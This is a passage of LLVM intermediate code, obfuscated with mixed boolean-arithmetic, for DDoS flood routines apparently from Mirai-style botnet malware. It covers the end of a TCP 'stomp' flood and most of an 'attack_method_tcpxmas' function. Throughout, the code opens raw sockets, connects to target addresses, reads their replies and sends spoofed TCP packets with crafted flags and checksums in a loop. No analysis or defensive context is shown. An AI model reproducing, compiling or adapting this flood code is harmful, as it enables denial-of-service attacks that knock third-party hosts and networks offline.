  %628 = and i16 %613, %624
  %629 = or i16 %625, %626
  %630 = or i16 %627, %628
  %631 = xor i16 %629, %630
  %632 = or i16 %622, %623
  %633 = xor i16 %632, -1
  %634 = or i16 21910, %624
  %635 = and i16 %633, %634
  %636 = or i16 %631, %635
  %637 = or i16 %620, %613
  store i16 %636, i16* %607, align 4
  %638 = load i8, i8* %22, align 1
  %639 = sext i8 %638 to i16
  %640 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %641 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %640, i32 0, i32 4
  %642 = load i16, i16* %641, align 4
  %643 = xor i16 1, -1
  %644 = xor i16 %639, %643
  %645 = and i16 %644, %639
  %646 = and i16 %639, 1
  %647 = shl i16 %645, 9
  %648 = xor i16 %642, -1
  %649 = xor i16 -513, -1
  %650 = xor i16 15493, -1
  %651 = or i16 %648, %649
  %652 = or i16 15493, %650
  %653 = xor i16 %651, -1
  %654 = and i16 %653, %652
  %655 = and i16 %642, -513
  %656 = and i16 %654, %647
  %657 = xor i16 %654, %647
  %658 = or i16 %656, %657
  %659 = or i16 %654, %647
  store i16 %658, i16* %641, align 4
  %660 = load i8, i8* %23, align 1
  %661 = sext i8 %660 to i16
  %662 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %663 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %662, i32 0, i32 4
  %664 = load i16, i16* %663, align 4
  %665 = xor i16 1, -1
  %666 = xor i16 %661, %665
  %667 = and i16 %666, %661
  %668 = and i16 %661, 1
  %669 = shl i16 %667, 8
  %670 = xor i16 -257, -1
  %671 = xor i16 %664, %670
  %672 = and i16 %671, %664
  %673 = and i16 %664, -257
  %674 = xor i16 %672, -1
  %675 = xor i16 %669, -1
  %676 = xor i16 32222, -1
  %677 = and i16 %674, 32222
  %678 = and i16 %672, %676
  %679 = and i16 %675, 32222
  %680 = and i16 %669, %676
  %681 = or i16 %677, %678
  %682 = or i16 %679, %680
  %683 = xor i16 %681, %682
  %684 = or i16 %674, %675
  %685 = xor i16 %684, -1
  %686 = or i16 32222, %676
  %687 = and i16 %685, %686
  %688 = or i16 %683, %687
  %689 = or i16 %672, %669
  store i16 %688, i16* %663, align 4
  %690 = load i8*, i8** %38, align 8
  %691 = load i32, i32* %24, align 4
  call void @rand_str(i8* %690, i32 %691)
  br label %740

; <label>:692:                                    ; preds = %268, %253
  %693 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %694 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %693, i32 0, i32 4
  %695 = load i16, i16* %694, align 4
  %696 = lshr i16 %695, 8
  %697 = xor i16 %696, -1
  %698 = xor i16 1, -1
  %699 = xor i16 -26262, -1
  %700 = or i16 %697, %698
  %701 = or i16 -26262, %699
  %702 = xor i16 %700, -1
  %703 = and i16 %702, %701
  %704 = and i16 %696, 1
  %705 = zext i16 %703 to i32
  %706 = icmp ne i32 %705, 0
  br i1 %706, label %722, label %707

; <label>:707:                                    ; preds = %692
  %708 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %709 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %708, i32 0, i32 4
  %710 = load i16, i16* %709, align 4
  %711 = lshr i16 %710, 10
  %712 = xor i16 %711, -1
  %713 = xor i16 1, -1
  %714 = xor i16 29707, -1
  %715 = or i16 %712, %713
  %716 = or i16 29707, %714
  %717 = xor i16 %715, -1
  %718 = and i16 %717, %716
  %719 = and i16 %711, 1
  %720 = zext i16 %718 to i32
  %721 = icmp ne i32 %720, 0
  br i1 %721, label %722, label %725

; <label>:722:                                    ; preds = %707, %692
  %723 = load i32, i32* %26, align 4
  %724 = call i32 @close(i32 %723)
  br label %121

; <label>:725:                                    ; preds = %707
  br label %726

; <label>:726:                                    ; preds = %725
  br label %727

; <label>:727:                                    ; preds = %726, %241
  br label %728

; <label>:728:                                    ; preds = %727, %237, %229
  %729 = call i64 @time(i64* null) #6
  %730 = load i64, i64* %31, align 8
  %731 = add i64 %729, 8923172892182671965
  %732 = sub i64 %731, %730
  %733 = sub i64 %732, 8923172892182671965
  %734 = sub nsw i64 %729, %730
  %735 = icmp sgt i64 %733, 10
  br i1 %735, label %736, label %739

; <label>:736:                                    ; preds = %728
  %737 = load i32, i32* %26, align 4
  %738 = call i32 @close(i32 %737)
  br label %121

; <label>:739:                                    ; preds = %728
  br label %217

; <label>:740:                                    ; preds = %411
  br label %741

; <label>:741:                                    ; preds = %740, %124
  %742 = load i32, i32* %9, align 4
  %743 = add i32 %742, -1507231262
  %744 = add i32 %743, 1
  %745 = sub i32 %744, -1507231262
  %746 = add nsw i32 %742, 1
  store i32 %745, i32* %9, align 4
  br label %115

; <label>:747:                                    ; preds = %115
  br label %748

; <label>:748:                                    ; preds = %877, %747
  store i32 0, i32* %9, align 4
  br label %749

; <label>:749:                                    ; preds = %871, %748
  %750 = load i32, i32* %9, align 4
  %751 = load i8, i8* %5, align 1
  %752 = zext i8 %751 to i32
  %753 = icmp slt i32 %750, %752
  br i1 %753, label %754, label %877

; <label>:754:                                    ; preds = %749
  %755 = load i8**, i8*** %12, align 8
  %756 = load i32, i32* %9, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds i8*, i8** %755, i64 %757
  %759 = load i8*, i8** %758, align 8
  store i8* %759, i8** %39, align 8
  %760 = load i8*, i8** %39, align 8
  %761 = bitcast i8* %760 to %struct.iphdr*
  store %struct.iphdr* %761, %struct.iphdr** %40, align 8
  %762 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %763 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %762, i64 1
  %764 = bitcast %struct.iphdr* %763 to %struct.tcphdr*
  store %struct.tcphdr* %764, %struct.tcphdr** %41, align 8
  %765 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %766 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %765, i64 1
  %767 = bitcast %struct.tcphdr* %766 to i8*
  store i8* %767, i8** %42, align 8
  %768 = load i16, i16* %14, align 2
  %769 = zext i16 %768 to i32
  %770 = icmp eq i32 %769, 65535
  br i1 %770, label %771, label %780

; <label>:771:                                    ; preds = %754
  %772 = call i32 @rand_next()
  %773 = xor i32 65535, -1
  %774 = xor i32 %772, %773
  %775 = and i32 %774, %772
  %776 = and i32 %772, 65535
  %777 = trunc i32 %775 to i16
  %778 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %779 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %778, i32 0, i32 3
  store i16 %777, i16* %779, align 4
  br label %780

; <label>:780:                                    ; preds = %771, %754
  %781 = load i8, i8* %25, align 1
  %782 = icmp ne i8 %781, 0
  br i1 %782, label %783, label %786

; <label>:783:                                    ; preds = %780
  %784 = load i8*, i8** %42, align 8
  %785 = load i32, i32* %24, align 4
  call void @rand_str(i8* %784, i32 %785)
  br label %786

; <label>:786:                                    ; preds = %783, %780
  %787 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %788 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %787, i32 0, i32 7
  store i16 0, i16* %788, align 2
  %789 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %790 = bitcast %struct.iphdr* %789 to i16*
  %791 = call zeroext i16 @checksum_generic(i16* %790, i32 20)
  %792 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %793 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %792, i32 0, i32 7
  store i16 %791, i16* %793, align 2
  %794 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %795 = load i32, i32* %9, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %794, i64 %796
  %798 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %797, i32 0, i32 1
  %799 = load i32, i32* %798, align 4
  %800 = sub i32 0, %799
  %801 = sub i32 0, 1
  %802 = add i32 %800, %801
  %803 = sub i32 0, %802
  %804 = add i32 %799, 1
  store i32 %803, i32* %798, align 4
  %805 = trunc i32 %799 to i16
  %806 = call zeroext i16 @htons(i16 zeroext %805) #7
  %807 = zext i16 %806 to i32
  %808 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %809 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %808, i32 0, i32 2
  store i32 %807, i32* %809, align 4
  %810 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %811 = load i32, i32* %9, align 4
  %812 = sext i32 %811 to i64
  %813 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %810, i64 %812
  %814 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %813, i32 0, i32 2
  %815 = load i32, i32* %814, align 4
  %816 = trunc i32 %815 to i16
  %817 = call zeroext i16 @htons(i16 zeroext %816) #7
  %818 = zext i16 %817 to i32
  %819 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %820 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %819, i32 0, i32 3
  store i32 %818, i32* %820, align 4
  %821 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %822 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %821, i32 0, i32 6
  store i16 0, i16* %822, align 4
  %823 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %824 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %825 = bitcast %struct.tcphdr* %824 to i8*
  %826 = load i32, i32* %24, align 4
  %827 = sext i32 %826 to i64
  %828 = sub i64 0, %827
  %829 = sub i64 20, %828
  %830 = add i64 20, %827
  %831 = trunc i64 %829 to i16
  %832 = call zeroext i16 @htons(i16 zeroext %831) #7
  %833 = load i32, i32* %24, align 4
  %834 = sext i32 %833 to i64
  %835 = add i64 20, -6076681900336946177
  %836 = add i64 %835, %834
  %837 = sub i64 %836, -6076681900336946177
  %838 = add i64 20, %834
  %839 = trunc i64 %837 to i32
  %840 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %823, i8* %825, i16 zeroext %832, i32 %839)
  %841 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %842 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %841, i32 0, i32 6
  store i16 %840, i16* %842, align 4
  %843 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %844 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %843, i32 0, i32 1
  %845 = load i16, i16* %844, align 2
  %846 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %847 = load i32, i32* %9, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %846, i64 %848
  %850 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %849, i32 0, i32 0
  %851 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %850, i32 0, i32 1
  store i16 %845, i16* %851, align 2
  %852 = load i32, i32* %10, align 4
  %853 = load i8*, i8** %39, align 8
  %854 = load i32, i32* %24, align 4
  %855 = sext i32 %854 to i64
  %856 = sub i64 0, 40
  %857 = sub i64 0, %855
  %858 = add i64 %856, %857
  %859 = sub i64 0, %858
  %860 = add i64 40, %855
  %861 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %862 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %863 = load i32, i32* %9, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %862, i64 %864
  %866 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %865, i32 0, i32 0
  %867 = bitcast %struct.sockaddr_in* %866 to %struct.sockaddr*
  store %struct.sockaddr* %867, %struct.sockaddr** %861, align 8
  %868 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %869 = load %struct.sockaddr*, %struct.sockaddr** %868, align 8
  %870 = call i64 @sendto(i32 %852, i8* %853, i64 %859, i32 16384, %struct.sockaddr* %869, i32 16)
  br label %871

; <label>:871:                                    ; preds = %786
  %872 = load i32, i32* %9, align 4
  %873 = sub i32 %872, 598893564
  %874 = add i32 %873, 1
  %875 = add i32 %874, 598893564
  %876 = add nsw i32 %872, 1
  store i32 %875, i32* %9, align 4
  br label %749

; <label>:877:                                    ; preds = %749
  br label %748

; <label>:878:                                    ; preds = %228, %111, %105
  ret void
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %863

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %863

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %725, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %730

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %720, %707, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %725

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = and i32 %128, 2048
  %130 = xor i32 %128, 2048
  %131 = or i32 %129, %130
  %132 = or i32 %128, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %131)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %134, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %141, 32
  br i1 %142, label %143, label %168

; <label>:143:                                    ; preds = %125
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #7
  %151 = call i32 @rand_next()
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %151, %158
  %160 = sub i32 0, %150
  %161 = sub i32 0, %159
  %162 = add i32 %160, %161
  %163 = sub i32 0, %162
  %164 = add i32 %150, %159
  %165 = call i32 @htonl(i32 %163) #7
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %167 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %166, i32 0, i32 0
  store i32 %165, i32* %167, align 4
  br label %177

; <label>:168:                                    ; preds = %125
  %169 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %170 = load i32, i32* %9, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i32 0, i32 1
  %174 = load i32, i32* %173, align 4
  %175 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %176 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %175, i32 0, i32 0
  store i32 %174, i32* %176, align 4
  br label %177

; <label>:177:                                    ; preds = %168, %143
  %178 = load i16, i16* %17, align 2
  %179 = zext i16 %178 to i32
  %180 = icmp eq i32 %179, 65535
  br i1 %180, label %181, label %193

; <label>:181:                                    ; preds = %177
  %182 = call i32 @rand_next()
  %183 = xor i32 %182, -1
  %184 = xor i32 65535, -1
  %185 = xor i32 217907639, -1
  %186 = or i32 %183, %184
  %187 = or i32 217907639, %185
  %188 = xor i32 %186, -1
  %189 = and i32 %188, %187
  %190 = and i32 %182, 65535
  %191 = trunc i32 %189 to i16
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %191, i16* %192, align 2
  br label %197

; <label>:193:                                    ; preds = %177
  %194 = load i16, i16* %17, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %195, i16* %196, align 2
  br label %197

; <label>:197:                                    ; preds = %193, %181
  %198 = load i32, i32* %26, align 4
  %199 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %200 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %200, %struct.sockaddr** %199, align 8
  %201 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %202 = load %struct.sockaddr*, %struct.sockaddr** %201, align 8
  %203 = call i32 @connect(i32 %198, %struct.sockaddr* %202, i32 16)
  %204 = call i64 @time(i64* null) #6
  store i64 %204, i64* %31, align 8
  br label %205

; <label>:205:                                    ; preds = %723, %197
  store i32 16, i32* %29, align 4
  %206 = load i32, i32* %10, align 4
  %207 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %208 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %209 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %209, %struct.sockaddr** %208, align 8
  %210 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %211 = load %struct.sockaddr*, %struct.sockaddr** %210, align 8
  %212 = call i64 @recvfrom(i32 %206, i8* %207, i64 256, i32 16384, %struct.sockaddr* %211, i32* %29)
  %213 = trunc i64 %212 to i32
  store i32 %213, i32* %33, align 4
  %214 = load i32, i32* %33, align 4
  %215 = icmp eq i32 %214, -1
  br i1 %215, label %216, label %217

; <label>:216:                                    ; preds = %205
  br label %863

; <label>:217:                                    ; preds = %205
  %218 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %219 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 4
  %221 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %222 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 4
  %224 = icmp eq i32 %220, %223
  br i1 %224, label %225, label %713

; <label>:225:                                    ; preds = %217
  %226 = load i32, i32* %33, align 4
  %227 = sext i32 %226 to i64
  %228 = icmp ugt i64 %227, 40
  br i1 %228, label %229, label %713

; <label>:229:                                    ; preds = %225
  %230 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %231 = getelementptr inbounds i8, i8* %230, i64 20
  %232 = bitcast i8* %231 to %struct.tcphdr*
  store %struct.tcphdr* %232, %struct.tcphdr** %35, align 8
  %233 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 0
  %235 = load i16, i16* %234, align 4
  %236 = zext i16 %235 to i32
  %237 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %238 = load i16, i16* %237, align 2
  %239 = zext i16 %238 to i32
  %240 = icmp eq i32 %236, %239
  br i1 %240, label %241, label %712

; <label>:241:                                    ; preds = %229
  %242 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = lshr i16 %244, 9
  %246 = xor i16 %245, -1
  %247 = xor i16 1, -1
  %248 = xor i16 14888, -1
  %249 = or i16 %246, %247
  %250 = or i16 14888, %248
  %251 = xor i16 %249, -1
  %252 = and i16 %251, %250
  %253 = and i16 %245, 1
  %254 = zext i16 %252 to i32
  %255 = icmp ne i32 %254, 0
  br i1 %255, label %256, label %677

; <label>:256:                                    ; preds = %241
  %257 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %258 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %257, i32 0, i32 4
  %259 = load i16, i16* %258, align 4
  %260 = lshr i16 %259, 12
  %261 = xor i16 %260, -1
  %262 = xor i16 1, -1
  %263 = xor i16 15802, -1
  %264 = or i16 %261, %262
  %265 = or i16 15802, %263
  %266 = xor i16 %264, -1
  %267 = and i16 %266, %265
  %268 = and i16 %260, 1
  %269 = zext i16 %267 to i32
  %270 = icmp ne i32 %269, 0
  br i1 %270, label %271, label %677

; <label>:271:                                    ; preds = %256
  %272 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %273 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 4
  %275 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %276 = load i32, i32* %9, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %275, i64 %277
  %279 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %278, i32 0, i32 0
  store i32 %274, i32* %279, align 4
  %280 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 2
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #7
  %284 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %287, i32 0, i32 1
  store i32 %283, i32* %288, align 4
  %289 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %290 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %289, i32 0, i32 3
  %291 = load i32, i32* %290, align 4
  %292 = call i32 @ntohl(i32 %291) #7
